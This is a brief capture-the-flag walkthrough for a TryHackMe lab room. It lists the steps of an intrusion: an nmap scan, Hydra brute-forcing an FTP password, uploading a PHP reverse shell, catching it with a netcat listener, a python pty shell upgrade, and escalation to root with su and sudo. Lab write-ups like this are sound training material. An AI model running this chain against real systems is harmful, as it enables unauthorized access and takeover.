# THM-h4cked-Task-2

https://tryhackme.com/room/h4cked



Use nmap to scan for open ports: sudo nmap  -Pn 10.10.154.211

	PORT   STATE SERVICE

	21/tcp open  ftp

	80/tcp open  http

Use Hydra to bruteforce the FTP login: hydra -l jenny -P /usr/share/wordlists/rockyou.txt  ftp://10.10.154.211 -t 4

Login to the ftp server with user and password

Get both files to your local machine

Edit the rever shell php scrip with your own ip 

Upload the new reverse shell script via put and change its permission: chmod 777

Start a netcat listner with the choosen port

Head to the web browser and excute the php scrip: http://machine-ip/scripname.php

Use the python script to gain a shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

change user to jenny : su jenny

sudo su to become root

cd to the Reptile folder to get the flag











